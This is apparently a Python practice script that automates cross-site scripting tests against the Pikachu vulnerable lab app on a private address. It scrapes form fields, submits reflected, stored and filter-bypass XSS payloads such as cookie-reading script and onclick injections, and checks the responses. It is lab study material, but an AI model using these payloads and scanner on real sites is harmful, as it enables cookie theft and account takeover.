import requests
import urllib.parse
from bs4 import BeautifulSoup


def build_payloads_get(url, payload):
    # 编码参数
    encoded_params = urllib.parse.urlencode(payload)

    # 将查询参数附加到URL中
    full_url = url + '?' + encoded_params

    # 发送GET请求
    response = requests.get(full_url)
    return response.text

def build_payloads_post(url, payload):
    # 发送POST请求
    response = requests.post(url, data=payload)

    return response.text

def getParameter(url, data):
    response = requests.get(url)
    # 使用 BeautifulSoup 解析页面
    soup = BeautifulSoup(response.content, "html.parser")

    # 查找所有的表单
    forms = soup.find_all("form")

    # 遍历每个表单，获取参数
    for form in forms:
        # 查找表单中的所有输入元素
        inputs = form.find_all("input")
        name = []
        value_t = []
        # 打印表单参数及其值
        for input in inputs:
            # 获取输入元素的 name 属性值
            param = input.get("name")
            if param:
                # 获取输入元素的 value 属性值
                value = input.get("value")
                if value is None:
                    value = data
                print("表单参数:", param)
                print("参数值:", value)
                name.append(param)
                value_t.append(value)
    return name, value_t

def checkResponseForString(response, data):
    if data in response:
        print("字符串 '{}' 存在于响应中".format(data))
        return True
    else:
        print("字符串 '{}' 不存在于响应中".format(data))
        return False

def check_xss_get_relected(url):
    data = '<script>alert(1)</script>'
    # 获取表单参数和值
    name, value_t = getParameter(url, data)
    # 构建payload
    payload = {}
    for i in range(len(name)):
        payload[name[i]] = value_t[i]

    # 打印payload
    print("Payload:", payload)
    # 构建payload并发送GET请求
    response = build_payloads_get(url, payload)

    print(checkResponseForString(response, data))

def check_xss_post_reflected(url):
    payload_login = {
        'username': 'admin',
        'password': '123456',
        'submit': 'Login'
    }
    # 创建会话对象
    session = requests.Session()

    # 发送登录请求，获取并保存 Cookie
    response = session.post(url, data=payload_login)
    cookie = response.cookies
    data = '<script>alert(document.cookie)</script>'
    data_url = 'http://192.168.1.192:8086/pikachu/vul/xss/xsspost/xss_reflected_post.php'
    # 检查登录是否成功
    if response.status_code == 200:
        # 使用已保存的 Cookie 发送其他请求
        payload = {'message': '<script>alert(document.cookie)</script>', 'submit': 'submit'}
        response = session.post(data_url, data=payload)

        # 处理响应数据
        if response.status_code == 200:
            # 提取需要的数据或进行其他操作
            return checkResponseForString(response.text,data)
        else:
            return '访问受保护页面失败'
    else:
        return '登录失败'

def check_xss_stored(url):
    data = '<script>alert(document.cookie)</script>';
    # 构建查询参数
    payload = {'message': '<script>alert(document.cookie)</script>', 'submit': 'submit'}
    # 构建payload并发送GET请求
    response = build_payloads_post(url, payload)

    print(checkResponseForString(response, data))

def check_xss_filterate(url):
    data = '<a herf="#" onclick="alert(document.cookie)">';
    # 获取表单参数和值
    name, value_t = getParameter(url, data)
    # 构建payload
    payload = {}
    for i in range(len(name)):
        payload[name[i]] = value_t[i]

    # 打印payload
    print("Payload:", payload)
    # 构建payload并发送GET请求
    response = build_payloads_get(url, payload)

    print(checkResponseForString(response, data))

def check_xss_htmlspecialchars(url):
    data = "#' onclick='alert(document.cookie)'"
    # 获取表单参数和值
    name, value_t = getParameter(url, data)
    # 构建payload
    payload = {}
    for i in range(len(name)):
        payload[name[i]] = value_t[i]

    # 打印payload
    print("Payload:", payload)
    # 构建payload并发送GET请求
    response = build_payloads_get(url, payload)

    print(checkResponseForString(response, data))

def check_xss_herf(url):
    data = "javascript:alert(document.cookie)"
    # 获取表单参数和值
    name, value_t = getParameter(url, data)
    # 构建payload
    payload = {}
    for i in range(len(name)):
        payload[name[i]] = value_t[i]

    # 打印payload
    print("Payload:", payload)
    # 构建payload并发送GET请求
    response = build_payloads_get(url, payload)

    print(checkResponseForString(response, data))

def check_xss_js(url):
    data = "';alert(1);//"
    # 获取表单参数和值
    name, value_t = getParameter(url, data)
    # 构建payload
    payload = {}
    for i in range(len(name)):
        payload[name[i]] = value_t[i]

    # 打印payload
    print("Payload:", payload)
    # 构建payload并发送GET请求
    response = build_payloads_get(url, payload)

    print(checkResponseForString(response, data))
# 示例用法
if __name__ == '__main__':
    check_xss_get_relected('http://192.168.1.192:8086/pikachu/vul/xss/xss_reflected_get.php')
    check_xss_post_reflected('http://192.168.1.192:8086/pikachu/vul/xss/xsspost/post_login.php')
    check_xss_stored('http://192.168.1.192:8086/pikachu/vul/xss/xss_stored.php')
    check_xss_filterate('http://192.168.1.192:8086/pikachu/vul/xss/xss_01.php')
    check_xss_htmlspecialchars('http://192.168.1.192:8086/pikachu/vul/xss/xss_02.php')
    check_xss_herf('http://192.168.1.192:8086/pikachu/vul/xss/xss_03.php')
    check_xss_js('http://192.168.1.192:8086/pikachu/vul/xss/xss_04.php')